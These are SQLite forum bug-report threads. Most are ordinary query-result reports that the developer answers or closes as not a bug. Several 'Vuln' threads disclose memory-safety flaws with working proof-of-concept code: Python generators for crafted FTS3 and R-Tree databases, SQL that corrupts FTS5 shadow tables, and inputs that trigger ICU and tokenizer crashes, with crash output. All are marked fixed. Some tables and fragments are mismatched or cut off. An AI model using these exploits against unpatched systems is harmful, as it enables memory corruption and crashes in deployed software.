title: sum() function has different return type as window function and aggregate function

posts.author: ChiZhang
posts.body:
Hi,

I found sum() function has inconsistent return types when used as a window function and aggregate function.

This test case can reproduce this:
CREATE TABLE t(id, x);
INSERT INTO t VALUES(1, 0.5), (2, 9223372036854775807), (3, 1);

SELECT
id,
sum(x) OVER (
ORDER BY id
ROWS BETWEEN CURRENT ROW AND UNBOUNDED FOLLOWING
) AS win_sum
FROM t;

╭────┬─────────┬──────────╮
│ id │ win_sum │ win_type │
╞════╪═════════╪══════════╡
│  1 │     3.5 │ real     │
│  2 │     3.0 │ real     │
│  3 │     2.0 │ real     │
╰────┴─────────┴──────────╯

SELECT
id,
(SELECT sum(x) FROM t t2 WHERE t2.id>=t1.id) AS ref_sum
FROM t AS t1;

╭────┬─────────┬──────────╮
│ id │ ref_sum │ ref_type │
╞════╪═════════╪══════════╡
│  1 │     3.5 │ real     │
│  2 │       3 │ integer  │
│  3 │       2 │ integer  │
╰────┴─────────┴──────────╯

This can sometimes cause a different execution state, for example:
SELECT sqlite_version() AS sqlite_version;

WITH t(v) AS (VALUES('A'),('a'))
SELECT
'window-singleton-collate' AS case_name,
got
FROM (
SELECT DISTINCT first_value(v) OVER (ORDER BY v) IN ('a' COLLATE nocase) AS got
FROM t
);

╭────┬────────────────────────╮
│ id │        win_sum         │
╞════╪════════════════════════╡
│  1 │ 9.2233720368547758e+18 │
│  2 │ 9.2233720368547758e+18 │
│  3 │                    1.0 │
╰────┴────────────────────────╯

WITH t(v) AS (VALUES('A'),('a'))
SELECT
'window-singleton-collate-ref' AS case_name,
((SELECT v FROM t ORDER BY v LIMIT 1) COLLATE binary IN ('a' COLLATE nocase)) AS ref;

╭────┬────────────────────────╮
│ id │        ref_sum         │
╞════╪════════════════════════╡
│  1 │ 9.2233720368547758e+18 │
╰────┴────────────────────────╯
Error near line 16: integer overflow

I can reproduce this with the trunk version 8cc0b52cca2d6b15

posts.author: drh
posts.body:
NOT A BUG.

This returns false:

SELECT 'A' COLLATE binary IN ('a' COLLATE nocase);

Because (according to the COLLATE documentation, section 7.1, item 1)
the collation on the left operand takes precedence.

title: format('%!.0J') treats zero precision as unlimited

posts.author: ChiZhang
posts.body:
Hi,

I found that the format() function returns incorrect results when the precision is zero. This test case can reproduce this:
WITH t(id, x) AS (
VALUES
(1, 'abc'),
(2, 'αβ')
),
src AS (
SELECT
id,
row_number() OVER (ORDER BY id) AS rn,
format('%!.0J', x) AS got
FROM t
),
ref AS (
SELECT
id,
(SELECT count(*) FROM t AS t2 WHERE t2.id <= t1.id) AS rn,
json_quote(substr(x, 1, 0)) AS got
FROM t AS t1
)
SELECT 'src_minus_ref' AS side, * FROM (SELECT * FROM src EXCEPT SELECT * FROM ref)
UNION ALL
SELECT 'ref_minus_src', * FROM (SELECT * FROM ref EXCEPT SELECT * FROM src);

╭───────────────┬────┬────┬───────╮
│     side      │ id │ rn │  got  │
╞═══════════════╪════╪════╪═══════╡
│ src_minus_ref │  1 │  1 │ "abc" │
│ src_minus_ref │  2 │  2 │ "ab"  │
│ ref_minus_src │  1 │  1 │ ""    │
│ ref_minus_src │  2 │  2 │ ""    │
╰───────────────┴────┴────┴───────╯

I can reproduce this with the trunk version 8cc0b52cca2d6b15

1 + (
SELECT count(*)
FROM t AS p NOT INDEXED

title: sqlite_dbpage accepts an out-of-range pgno on write and wraps it to page 1, corrupting the database header instead of rejecti

posts.author: ChiZhang

Hi,

I found that sqlite_dbpage accepts an out-of-range pgno on write and wraps it to page 1, corrupting the database header instead of rejecting the request.

This test case can reproduce this:
.dbconfig defensive off

CREATE TABLE t(a);
INSERT INTO t VALUES(1);

SELECT quote(substr(data,1,16)) AS before_header
FROM sqlite_dbpage
WHERE pgno=1;

╭─────────────────────────────────────╮

INSERT INTO sqlite_dbpage(pgno,data)
SELECT 4294967297, zeroblob(length(data))
FROM sqlite_dbpage
WHERE pgno=1;

SELECT quote(substr(data,1,16)) AS after_header
FROM sqlite_dbpage
WHERE pgno=1;

Error near line 9: file is not a database

title: NUMERIC cast extreme underflow becomes integer

posts.author: ChiZhang
posts.body:
Hi,

I found that the NUMBER cast can trigger an underflow.

This test case can reproduce this:
WITH src(v) AS (
VALUES('0.0'),
('2.5e-9999')
)
SELECT
v,
quote(CAST(v AS REAL)) AS real_quote,
typeof(CAST(v AS REAL)) AS real_type,
quote(CAST(v AS NUMERIC)) AS numeric_quote,
typeof(CAST(v AS NUMERIC)) AS numeric_type
FROM src;
╭───────────┬────────────┬───────────┬───────────────┬──────────────╮
│     v     │ real_quote │ real_type │ numeric_quote │ numeric_type │
╞═══════════╪════════════╪═══════════╪═══════════════╪══════════════╡
│ 0.0       │ 0.0        │ real      │ 0             │ integer      │
│ 2.5e-9999 │ 0.0        │ real      │ 0             │ integer      │
╰───────────┴────────────┴───────────┴───────────────┴──────────────╯

CREATE TABLE t_num(x NUMERIC);
INSERT INTO t_num VALUES('0.0'),('2.5e-9999');
SELECT quote(x) AS stored_quote, typeof(x) AS stored_type FROM t_num ORDER BY rowid;
╭──────────────┬─────────────╮
│ stored_quote │ stored_type │
╞══════════════╪═════════════╡
│ 0            │ integer     │
│ 0            │ integer     │
╰──────────────┴─────────────╯

I can reproduce this with the trunk version 8cc0b52cca2d6b15

posts.author: drh
posts.body:
This is expected behavior.  2.5e-9999 rounds to the nearest IEEE 754 number which is 0.0,
and 0.0 simplifies to an integer 0.

NOT A BUG.

title: Vuln1: Signed Integer Overflow and Out-of-Bounds Write in FTS3 fts3auxNextMethod Column Index

posts.author: drh
posts.body: Fixed at check-in 2026-05-18T20:27:57.529Z

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").
.

Summary
In ext/fts3/fts3_aux.c at fts3auxNextMethod() lines 342 to 349, the column number iCol decoded from a doclist varint is used in the expression iCol+2 without an overflow guard, so a value close to INT_MAX wraps to a negative size that bypasses the fts3auxGrowStatArray bound check and lets pCsr->aStat[iCol+1].nDoc++ write far out of bounds.

PoC
Python generator (vuln_001_gen.py):
#!/usr/bin/env python3
"""
PoC generator for integer overflow in fts3auxNextMethod().
The vulnerability: In fts3auxNextMethod() (fts3_aux.c line 342-349), when
parsing a doclist position list, a column number is read as a 64-bit varint,
cast to int, and then iCol+2 is computed to grow the stats array. If the
column number is near INT_MAX (e.g., 0x7FFFFFFE), then iCol+2 overflows
signed 32-bit int to a negative value. The fts3auxGrowStatArray() function
checks if nSize > pCsr->nStat, but since nSize is negative, the check fails.
Then pCsr->aStat[iCol+1].nDoc++ writes far out of bounds.
Strategy:
1. Create a valid FTS4 table with a term
2. Directly corrupt the %_segments blob to inject a position list with
a column separator (0x01) followed by varint encoding of 0x7FFFFFFE
"""
import sqlite3
import struct
import os
import sys
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.db")
def encode_fts3_varint(value):
"""Encode an integer as an FTS3 varint (little-endian, 7 bits per byte, MSB=continuation)."""
result = bytearray()
v = value & 0xFFFFFFFFFFFFFFFF  # treat as unsigned 64-bit
while True:
byte = v & 0x7F
v >>= 7
if v != 0:
byte |= 0x80
result.append(byte)
if v == 0:
break
return bytes(result)
def create_malicious_db():
"""Create a malicious SQLite database that triggers the vulnerability."""
# Remove existing DB
if os.path.exists(DB_PATH):
os.unlink(DB_PATH)
conn = sqlite3.connect(DB_PATH)
cur = conn.cursor()
# Create FTS4 table with multiple columns so column separators are valid
cur.execute("CREATE VIRTUAL TABLE t1 USING fts4(a, b, c);")
# Insert a document to generate a segment with a valid term
cur.execute("INSERT INTO t1(a, b, c) VALUES('hello', 'world', 'test');")
# Create the fts4aux virtual table
cur.execute("CREATE VIRTUAL TABLE t1_aux USING fts4aux(t1);")
conn.commit()
# Now we need to corrupt the segment data in t1_segments.
# First, let's see what's in t1_segments
cur.execute("SELECT blockid, block FROM t1_segments;")
rows = cur.fetchall()
if not rows:
# If no segments yet, we need to force a flush. Let's insert more data
# and use optimize
for i in range(100):
cur.execute("INSERT INTO t1(a, b, c) VALUES('hello', 'world', 'test');")
conn.commit()
cur.execute("INSERT INTO t1(t1) VALUES('optimize');")
conn.commit()
cur.execute("SELECT blockid, block FROM t1_segments;")
rows = cur.fetchall()
print(f"Found {len(rows)} segment blocks")
# Let's look at what segment leaves look like
# FTS3 segment leaves contain:
#   - For each term: term prefix/suffix, then doclist
#   - Doclist: sequence of (docid_delta, position_list, 0x00 terminator)
#   - Position list: sequence of varints where:
#     - 0x00 = end of position list (doclist terminator)
#     - 0x01 = column separator, next varint is column number
#     - >= 2 = position delta + 2
# Strategy: find a segment blob and inject a malicious position list
# We'll craft a minimal valid segment leaf node with our malicious data
# Let's look at the segment directory to understand the structure
cur.execute("SELECT * FROM t1_segdir;")
segdir_rows = cur.fetchall()
print(f"Segment directory entries: {len(segdir_rows)}")
for row in segdir_rows:
print(f"  segdir: level={row[0]}, idx={row[1]}, start_block={row[2]}, "
f"leaves_end_block={row[3]}, end_block={row[4]}, root blob len={len(row[5]) if row[5] else 0}")
# For small tables, the segment data is stored directly in the root blob
# of the segdir table. Let's corrupt that.
# The segment root/leaf node format for FTS3:
# For a leaf node that's stored inline in segdir:
#   [term_data] [doclist_data]
#
# Term data format in a leaf:
#   varint: prefix length (shared with previous term)
#   varint: suffix length
#   suffix bytes
#   varint: doclist size
#   doclist bytes
# Let's just craft our own segment blob directly.
# We'll create a simple segment with one term "hello" and a malicious doclist.
# First, delete existing segments and segdir entries
cur.execute("DELETE FROM t1_segments;")
cur.execute("DELETE FROM t1_segdir;")
cur.execute("DELETE FROM t1_stat;")
conn.commit()
# Craft a malicious segment root blob (inline leaf node)
# Format of a leaf node stored as root in segdir:
#   For each term:
#     varint: nPrefix (shared prefix length with previous term)
#     varint: nSuffix (length of suffix)
#     char[nSuffix]: suffix bytes
#     varint: nDoclist (length of following doclist)
#     char[nDoclist]: doclist bytes
# Doclist format:
#   varint: first docid
#   position_list
#   0x00 (end of position list / end of doclist entry)
#
# Position list format:
#   varint: position+2 (for column 0 positions)
#   OR 0x01 followed by varint column_number (column separator)
#   terminated by 0x00
# Our malicious doclist:
#   docid = 1 (varint: 0x01)
#   position in col 0: position 0, encoded as 0+2=2 (varint: 0x02)
#   column separator: 0x01
#   column number: 0x7FFFFFFE (this triggers the overflow)
#   position in that column: position 0, encoded as 0+2=2 (varint: 0x02)
#   end of doclist: 0x00
# Encode the malicious column number
malicious_col = 0x7FFFFFFE  # INT_MAX - 1, so iCol+2 overflows
col_varint = encode_fts3_varint(malicious_col)
print(f"Malicious column varint ({malicious_col}): {col_varint.hex()}")
# Build the doclist
doclist = bytearray()
doclist += encode_fts3_varint(1)       # docid = 1
doclist += encode_fts3_varint(2)       # position 0 in col 0 (encoded as pos+2)
doclist.append(0x01)                   # column separator byte
doclist += col_varint                  # malicious column number
doclist += encode_fts3_varint(2)       # position 0 in new col (encoded as pos+2)
doclist.append(0x00)                   # end of position list / end of doclist
print(f"Doclist ({len(doclist)} bytes): {doclist.hex()}")
# Build the term entry in the leaf
term = b"hello"
leaf = bytearray()
leaf += encode_fts3_varint(0)          # nPrefix = 0 (first term)
leaf += encode_fts3_varint(len(term))  # nSuffix
leaf += term                           # suffix (= full term since nPrefix=0)
leaf += encode_fts3_varint(len(doclist))  # doclist size
leaf += doclist                         # the doclist
print(f"Leaf node ({len(leaf)} bytes): {leaf.hex()}")
# Insert into segdir with this as the root blob (inline leaf)
# segdir columns: level, idx, start_block, leaves_end_block, end_block, root
# For inline segments: start_block=0, leaves_end_block=0, end_block=0
cur.execute(
"INSERT INTO t1_segdir(level, idx, start_block, leaves_end_block, end_block, root) "
"VALUES(0, 0, 0, 0, 0, ?);",
(bytes(leaf),)
)
# Also need to update t1_stat to reflect this
# t1_stat format: a blob with varint nDoc, varint nCol, then per-column sizes
# Let's just insert a minimal stat entry
stat_blob = bytearray()
stat_blob += encode_fts3_varint(1)   # 1 document
stat_blob += encode_fts3_varint(1)   # col 0 has 1 token
stat_blob += encode_fts3_varint(1)   # col 1 has 1 token
stat_blob += encode_fts3_varint(1)   # col 2 has 1 token
cur.execute("INSERT INTO t1_stat VALUES(0, ?);", (bytes(stat_blob),))
conn.commit()
# Verify the table exists
cur.execute("SELECT name FROM sqlite_master WHERE type='table';")
tables = cur.fetchall()
print(f"Tables: {[t[0] for t in tables]}")
conn.close()
print(f"\nMalicious database written to: {DB_PATH}")
print("To trigger: SELECT * FROM t1_aux;")
if __name__ == "__main__":
create_malicious_db()

Trigger output:
yuelinwang@XXF-GPU-03:/data/ylwang/LargeScan/targets/sqlite$ ./sqlite3 /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_fts3_fts3_aux/vuln_001.db
SQLite version 3.54.0 2026-05-15 18:36:11
Enter ".help" for usage hints.
SQLite-3.54 vuln_001.db-> SELECT * FROM t1_aux;
sqlite3.c:199477:15: runtime error: signed integer overflow: 2147483646 + 2 cannot be represented in type 'int'

posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/fts3/fts3_expr.c near line 198192 of the amalgamation, the NEAR/N distance value parsed from the query is later incremented by 1 without bound checking, so supplying NEAR/2147483647 triggers a signed 32-bit overflow inside the FTS3 expression compiler.

INSERT INTO fts_test(content) VALUES ('the sensitive information and data fields');
INSERT INTO fts_test(content) VALUES ('data is sensitive');
SELECT rowid, content FROM fts_test WHERE content MATCH 'sensitive NEAR/10 data';
SELECT rowid, content FROM fts_test WHERE content MATCH 'sensitive NEAR/2147483647 data';

title: Vuln5: Stack Overflow in FTS5 Porter Tokenizer via Unbounded Wrapper Chaining

posts.author: drh
posts.body: Fixed by check-in 0bdeedf56c9d7209.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/fts5/fts5_tokenize.c the porter tokenizer wrapper instantiates the next tokenizer named in its tokenize argument list by recursive call without enforcing a depth limit, so a CREATE VIRTUAL TABLE that chains tens of thousands of porter entries exhausts the native call stack during fts5 tokenizer creation.

PoC
Python generator (vuln_001_gen.py):
#!/usr/bin/env python3
"""Generate vuln_001.sql: FTS5 porter tokenizer unbounded recursion PoC."""
import os
N = 50000
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.sql")
tokenize_arg = " ".join(["porter"] * N)
sql = f'CREATE VIRTUAL TABLE t USING fts5(content, tokenize="{tokenize_arg}");\n'
with open(OUT, "w") as f:
f.write(sql)
print(f"Wrote {OUT} ({os.path.getsize(OUT)} bytes, {N} repetitions)")

title: Vuln4: Assertion Failure in FTS5 fts5IndexExtractColset Buffer Append Caused by Unbounded Varint Continuation Loop

posts.author: drh
posts.body: Fixed by check-in 70021c3291b38192.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/fts5/fts5_index.c at line 3709 the loop while( *p++ & 0x80 ) inside fts5IndexExtractColset advances without checking the position list end pointer, so a corrupted position list whose trailing bytes carry the 0x80 continuation bit lets the scan walk far past the source buffer and the subsequent fts5BufferSafeAppendBlob call trips the buffer space assertion at sqlite3.c:253108 ((&pIter->poslist)->nSpace >= (&pIter->poslist)->n + p - aCopy) before the would-be heap overflow occurs.

PoC
SQL script (vuln_001.sql):
-- Step 1: Disable defensive mode to allow shadow table writes
.dbconfig defensive off
-- Step 2: Create FTS5 table with 3 columns (detail=full is default)
-- Using 3 columns so we can query with a multi-column filter ({a b}: ...)
-- which triggers the nCol>1 path in fts5IndexExtractColset where the
-- buffer overflow occurs via fts5BufferSafeAppendBlob.
CREATE VIRTUAL TABLE t1 USING fts5(a, b, c);
-- Step 3: Insert data with many unique terms to create a large leaf page.
-- The word 'hello' goes in column a. Many other words fill the page
-- so there are hundreds of bytes after hello's 1-byte position list.
INSERT INTO t1 VALUES(
'hello',
'alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray yankee zulu',
'ant bear cat dog elephant fox gorilla hippo iguana jaguar kangaroo lion monkey newt octopus panda quail rabbit snake turtle unicorn vulture walrus xerus yak zebra'
);
-- Step 4: Corrupt the %_data shadow table.
-- The leaf page blob has:
--   - bytes 0-168:   header, terms before 'hello', hello's term + rowid + nSz
--   - byte 169:      hello's 1-byte position list (normally 0x02)
--   - bytes 170-616: subsequent terms' data
--   - bytes 617-632: page index entries needed for 'hello' lookup (16 bytes)
--   - bytes 633-669: page index entries NOT needed for 'hello' lookup
--
-- We corrupt bytes 169-616 to 0xFF (varint continuation bytes).
-- The page index entries for 'hello' (bytes 617-632) are preserved.
-- Remaining footer entries (633-669) are set to 0xFF.
--
-- When fts5IndexExtractColset processes hello's position list:
--   pPos = &leaf[169], nPos = 1, pEnd = &leaf[170]
--   Buffer allocated: 64 bytes (minimum allocation)
--   Inner loop reads through 448 bytes of 0xFF until hitting footer byte 0x04
--   fts5BufferSafeAppendBlob tries to copy ~449 bytes into 64-byte buffer
--   -> HEAP BUFFER OVERFLOW
UPDATE t1_data SET block = unhex(
-- Preserve bytes 0-168: header through hello's nSz field
hex(substr(block, 1, 169))
-- Inject 448 bytes of 0xFF: corrupted poslist + subsequent term data
|| replace(hex(zeroblob(448)), '00', 'FF')
-- Preserve 16 bytes of page index needed for hello lookup
|| hex(substr(block, 618, 16))
-- Corrupt remaining 37 footer bytes (not needed for hello lookup)
|| replace(hex(zeroblob(37)), '00', 'FF')
)
WHERE id = 137438953473;
-- Step 5: Trigger the vulnerability with a multi-column filter query.
-- The {a b} filter creates a colset with nCol=2, which takes the code path
-- in fts5IndexExtractColset that allocates a buffer and copies data via
-- fts5BufferSafeAppendBlob (line 3718).
SELECT * FROM t1 WHERE t1 MATCH '{a b}: hello';

Trigger output:
yuelinwang@XXF-GPU-03:/data/ylwang/LargeScan/targets/sqlite$ ./sqlite3 < /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_fts5_fts5_index/vuln_001.sql
defensive off
sqlite3: sqlite3.c:253108: fts5IndexExtractColset: Assertion `(&pIter->poslist)->nSpace>=((&pIter->poslist)->n+p-aCopy)' failed.
Aborted (core dumped)

title: Vuln6: Integer Overflow and Double Free in ICU Extension icuCaseFunc16

posts.author: drh
posts.body: Fixed by check-in 2026-05-19T18:56:11.055Z.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/icu/icu.c at icuCaseFunc16() lines 397 to 399, the computation nOut = 2 * u_strToUpper(...) multiplies a UChar count by 2 in a signed 32-bit int without overflow protection, so a sufficiently long U+0390 input wraps nOut to a negative value that makes sqlite3_realloc free the buffer and return NULL while leaving the later sqlite3_free(zOutput) to operate on the freed pointer as a double free.

.load /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_icu_icu/icu
-- Verify ICU is working: U+0390 should expand to 3 chars when uppercased
SELECT 'ICU_CHECK: length=' || length(upper(char(0x0390)));
-- Overflow trigger: build ~358M chars of U+0390 via recursive doubling + concat
-- 2^28 = 134,217,728 chars. Concatenate: 134M + 134M + 90M = 358,435,456 chars
-- This exceeds the overflow threshold of 357,913,942 UChars
WITH RECURSIVE c(x,n) AS (
VALUES(CAST(char(0x0390) AS TEXT), 1)
UNION ALL
SELECT x||x, n+1 FROM c WHERE n < 28
)
SELECT length(upper(x || x || substr(x, 1, 90000000))) FROM c WHERE n=28;

title: Vuln11: Assertion Failure in R-Tree rtreeStepToLeaf Caused by u8 iCell Overflow

posts.author: drh
posts.body: Fixed by check-in 2026-05-19T18:45:05.537Z.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/rtree/rtree.c the field RtreeSearchPoint.iCell is declared u8 at line 253 and is compared against the int nCell in the inner loop at line 1669 of rtreeStepToLeaf(), so a malicious database whose root node carries NCELL=300 lets nCell exceed 255 and fires the debug guard assert(nCell<200) at line 1667, while a release build instead enters an infinite loop in which pCellData advances past the node buffer for repeated heap out-of-bounds reads.

PoC
Python generator (vuln_002_gen.py):
#!/usr/bin/env python3
"""
Generate a malicious SQLite database that triggers the iCell u8 overflow
vulnerability in rtreeStepToLeaf().
The vulnerability: RtreeSearchPoint.iCell is declared as u8 (max 255).
When iNodeSize is large enough (read from root node blob size during xConnect),
NCELL can exceed 255. In rtreeStepToLeaf(), the inner while loop increments
p->iCell (u8) which wraps from 255->0, causing an infinite loop and heap OOB
reads as pCellData advances past the node buffer.
In debug builds, assert(nCell<200) fires first, causing an abort.
"""
import sqlite3
import struct
import os
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.db")
if os.path.exists(DB_PATH):
os.remove(DB_PATH)
conn = sqlite3.connect(DB_PATH)
cur = conn.cursor()
cur.execute("CREATE VIRTUAL TABLE t1 USING rtree(id, x1, x2);")
for i in range(100):
cur.execute("INSERT INTO t1 VALUES (?, ?, ?);", (i + 1, float(i), float(i + 1)))
conn.commit()
cur.execute("SELECT nodeno, length(data) FROM t1_node;")
nodes = cur.fetchall()
print(f"Existing nodes: {nodes}")
TARGET_BLOB_SIZE = 5000
DEPTH = 1          # non-leaf root (children are leaves)
NCELL_VAL = 300    # > 255, triggers u8 overflow
BYTES_PER_CELL = 16  # 8 (child ptr) + 4 (x1_min) + 4 (x1_max) for 1D
blob = bytearray(TARGET_BLOB_SIZE)
struct.pack_into(">HH", blob, 0, DEPTH, NCELL_VAL)
for i in range(NCELL_VAL):
offset = 4 + i * BYTES_PER_CELL
child_id = i + 2
x1_min = 0.0
x1_max = 1.0
struct.pack_into(">q", blob, offset, child_id)
struct.pack_into(">f", blob, offset + 8, x1_min)
struct.pack_into(">f", blob, offset + 12, x1_max)
root_blob = bytes(blob)
print(f"Crafted root blob size: {len(root_blob)}")
print(f"NCELL: {NCELL_VAL}, max allowed: {(TARGET_BLOB_SIZE-4)//BYTES_PER_CELL}")
cur.execute("SELECT nodeno FROM t1_node;")
all_nodes = [row[0] for row in cur.fetchall()]
cur.execute("UPDATE t1_node SET data = ? WHERE nodeno = 1;", (root_blob,))
for nodeno in all_nodes:
if nodeno == 1:
continue
leaf_blob = bytearray(TARGET_BLOB_SIZE)
struct.pack_into(">HH", leaf_blob, 0, 0, 0)
cur.execute("UPDATE t1_node SET data = ? WHERE nodeno = ?;",
(bytes(leaf_blob), nodeno))
conn.commit()
cur.execute("SELECT nodeno, length(data) FROM t1_node;")
final_nodes = cur.fetchall()
print(f"Final nodes: {final_nodes}")
conn.close()
print(f"Malicious database written to: {DB_PATH}")

Trigger SQL (vuln_002.sql):
SELECT * FROM t1 WHERE x1 > 999999;

Trigger output:
yuelinwang@XXF-GPU-03:/data/ylwang/LargeScan/targets/sqlite$ (cd .../ext_rtree_sqlite3rtree && python3 vuln_002_gen.py && timeout 5 ./sqlite3 vuln_002.db < vuln_002.sql)
NCELL: 300, max allowed: 312
Final nodes: [(1, 5000), (2, 5000), (3, 5000), (4, 5000), (5, 5000)]
Malicious database written to: .../vuln_002.db
sqlite3: sqlite3.c:219053: rtreeStepToLeaf: Assertion `nCell<200' failed.
timeout: the monitored command dumped core

title: NULL key value causes json_group_object returns incorrect result with window function

posts.author: ChiZhang (chizhang)
posts.body:
Hi,

I found that when there is a NULL value in the key of the json_group_object and jsonb_group_object functions with a window function, they will return an incorrect result.

This test case can trigger this:
WITH t(id,k,v) AS (
VALUES
(1,NULL,'skip'),
(2,'a',1),
(3,'b',2)
),
actual AS (
SELECT
id,
json_group_object(k,v) OVER (
ORDER BY id ROWS BETWEEN 1 PRECEDING AND CURRENT ROW
) AS json_win,
json(jsonb_group_object(k,v) OVER (
ORDER BY id ROWS BETWEEN 1 PRECEDING AND CURRENT ROW
)) AS jsonb_win
FROM t
),
expected AS (
SELECT
o.id,
(
SELECT json_group_object(i.k,i.v)
FROM t AS i
WHERE i.id BETWEEN o.id-1 AND o.id
) AS json_expected,
(
SELECT json(jsonb_group_object(i.k,i.v))
FROM t AS i
WHERE i.id BETWEEN o.id-1 AND o.id
) AS jsonb_expected
FROM t AS o
)
SELECT
a.id,
a.json_win,
e.json_expected,
a.jsonb_win,
e.jsonb_expected
FROM actual AS a
JOIN expected AS e USING(id);

╭────┬──────────┬───────────────┬───────────┬────────────────╮
│ id │ json_win │ json_expected │ jsonb_win │ jsonb_expected │
╞════╪══════════╪═══════════════╪═══════════╪════════════════╡
│  1 │ {}       │ {}            │ {}        │ {}             │
│  2 │ {"a":1}  │ {"a":1}       │ {"a":1}   │ {"a":1}        │
│  3 │ {"b":2}  │ {"a":1,"b":2} │ {"b":2}   │ {"a":1,"b":2}  │

title: Incorrect result of max() on json_each

posts.author: ChiZhang (chizhang)
posts.body:
Hi,

The following test case shows that the max() function returns an incorrect result on json_each.

This test case first creates a JSON with two lines: {"zzzzz":[1]} and {"aaaaa":[2]}, then selects the max and min root. However, both of them return aaaaa:
WITH
a(z) AS (SELECT replace(printf('%5c',' '), ' ', 'z')),
b(z) AS (SELECT replace(printf('%5c',' '), ' ', 'a')),
t(json,root_arg) AS (
SELECT '{"'||a.z||'":[1]}', '$.'||a.z FROM a
UNION ALL
SELECT '{"'||b.z||'":[2]}', '$.'||b.z FROM b
)
SELECT max(root), min(root), max(root||'')
FROM (
SELECT j.root AS root
FROM t, json_each(t.json, t.root_arg) AS j
); --- $.aaaaa|$.aaaaa|$.zzzzz

posts.author: drh
posts.body:
The "json" and "root" HIDDEN parameters to the json_each() virtual table are for
binding the arguments to the table-valued function only.  They do not generate
reliable outputs.  JSON documentation updated to state this explicitly.

WONT FIX.

title: Vuln13: Transitive Constraint Optimization Drops Valid Rows on Mixed Collation Equality

posts.author: drh
posts.body: Fixed by check-in 20c2f8ce9242c3db.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In src/whereexpr.c at termIsEquivalence() lines 964 to 991, condition 6 accepts any equality whose overall compare collation is BINARY without verifying that both operands actually share BINARY collation. When the planner later substitutes one operand for the other under SQLITE_Transitive, the substitution moves the comparison into a different collation context and the rewritten predicate rejects rows that the original predicate would have matched. A query joining a BINARY column with a NOCASE column and constraining the NOCASE side to an upper-cased literal silently drops valid matches.

PoC
SQL script (vuln_001.sql):
-- PoC for VULN 001: Transitive Constraint Optimization Collation Mismatch
.headers on
.mode column

CREATE TABLE t1(a TEXT);                    -- default BINARY collation
CREATE TABLE t2(b TEXT COLLATE NOCASE);     -- NOCASE collation
INSERT INTO t1 VALUES ('abc');
INSERT INTO t2 VALUES ('abc');

.print === Section 1: Buggy query (transitive optimization enabled, default) ===

title: Vuln15: Signed Integer Overflow in unixShmMap nByte Computation

posts.author: drh
posts.body: Fixed by check-in 9ac4a33a2932d353.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In src/os_unix.c at line 5144 inside unixShmMap(), the required mapping size is computed as a signed 32-bit product without overflow protection:
/* Minimum number of regions required to be mapped. */
nReqRegion = ((iRegion+nShmPerMap) / nShmPerMap) * nShmPerMap;

if( pShmNode->nRegion<nReqRegion ){
char **apNew;                      /* New apRegion[] array */
int nByte = nReqRegion*szRegion;   /* Minimum required file size */   // <-- line 5144
struct stat sStat;                 /* Used by fstat() */
...
if( sStat.st_size<nByte ){

Both nReqRegion and szRegion are int, and szRegion is WALINDEX_PGSZ = 32768. When iRegion is derived from a WAL-index header with mxFrame = 0xF0000000, walFramePage(mxFrame) returns 983040 and nReqRegion reaches 983041, so nReqRegion*szRegion evaluates to 32212303872 and wraps to a negative int. The subsequent sStat.st_size < nByte check is bypassed because a positive file size is not less than the negative nByte. Execution proceeds into osMmap() for a region far past the shared-memory file end and the access faults with SIGBUS.

PoC
Python generator (vuln_001_gen.py) crafts a WAL-mode database, a -shm file whose WalIndexHdr carries mxFrame=0xF0000000 with valid checksums, a minimal -wal file, and forks a helper to hold a shared DMS read lock on byte 128 of the -shm file so SQLite does not truncate the crafted header on open. The driver then runs sqlite3 vuln_001.db 'SELECT * FROM sqlite_master;'.

Run script (vuln_001_run.sh):
#!/bin/bash
cd "$(dirname "$0")"
exec python3 vuln_001_gen.py

title: Subquery returning a non-null value in WHERE clause incorrectly evaluates to FALSE and returns zero rows

posts.author: Jason Tang (820099082)
anonymous
posts.body:
An expression always returns a single result.

So ((SELECT DISTINCT t0.c0 FROM t0)) should be read as ((SELECT DISTINCT t0.c0 FROM t0 LIMIIT 1)).  Because of the index that will return NULL in current sqlite. Although sqlite is free to return any of the 3 values.

posts.author: Jason Tang (820099082)
posts.body:
But when I execute SQL SELECT * FROM t0 WHERE ((SELECT DISTINCT t0.c0 FROM t0)) IS NULL;
It still returns 0 raw.

posts.author: drh
posts.body:
Whenever you have a subquery is used as an expression, there is an implied "LIMIT 1" added
to the end.  So your subquery is really:

... (SELECT DISTINCT c0 FROM t0 LIMIT 1)

But because it has no ORDER BY clause, the result of that subquery is ambiguous.
It can be any of 1, NULL, or 'text'.  The database engine can choose any or those
three answers it wants. In your scenario, it is choosing NULL, which means the WHERE
clause is not true and the outer query returns no row.

Add an ORDER BY clause to the subquery that forces the row with the value 1 to
occur first, and the query will perform as you expect.

NOT A BUG

title: Contradictory WHERE conditions return identical result set in table-view cross join

posts.author: Jason Tang (820099082)
drh
posts.body:
NOT A BUG
The reasoning error here is the same as described in bug response 2026-05-24T16:50:57Z.
When a scalar subquery is able to return multiple rows in any order, then the row it chooses to return
is arbitrary.  If the rows are different, then the query is ambiguous.  Same issue here.

